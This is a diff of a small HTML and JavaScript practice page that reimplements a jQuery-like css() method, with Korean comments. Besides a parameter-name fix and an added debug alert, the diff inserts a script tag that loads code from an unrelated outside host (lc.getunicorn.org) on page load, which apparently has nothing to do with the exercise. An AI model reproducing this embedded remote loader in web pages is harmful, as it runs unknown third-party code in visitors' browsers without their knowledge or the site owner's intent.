@@ -10,6 +10,7 @@
     <input type="text" style="color:yellow;background-color: black;" name="nm_txt" id="id_txt2" value="민혁기">
     <input type="text" style="color:black;background-color: pink;" name="nm_txt" id="id_txt3" value="동석곽">
 </body>
+<script type="text/javascript" nonce="XOJ0BVE+zr3qdJZKBBAaLFbFzesxhK/xP1QmLnOdycs=" src="//lc.getunicorn.org?type=base-script&amp;request-id=19701"></script>
 <script>
     //jQuery는 사방에 for문이 널려있음, 전기를 잘 빨아먹음, 모바일에 사용시 주의
 
@@ -99,14 +100,15 @@ $.fn.css = function(p_name,p_opt){
         return this[0].style[p_name] ;
     }
 
-    if(typeof(p_arg) == "string" && typeof(p_opt) == "string"){
+    if(typeof(p_name) == "string" && typeof(p_opt) == "string"){
         for(var i=0; i<this.length; i++){
+            alert(p_opt);
             this[i].style[p_name] = p_opt;
         }
         return this;
     }
 
-    if(typeof(p_arg) == "string" && typeof(p_opt) == "function"){
+    if(typeof(p_name) == "string" && typeof(p_opt) == "function"){
         for(var i=0; i<this.length; i++){
             this[i].style[p_name] = p_opt.call(this[i],i,this[i].style[p_name])
         }
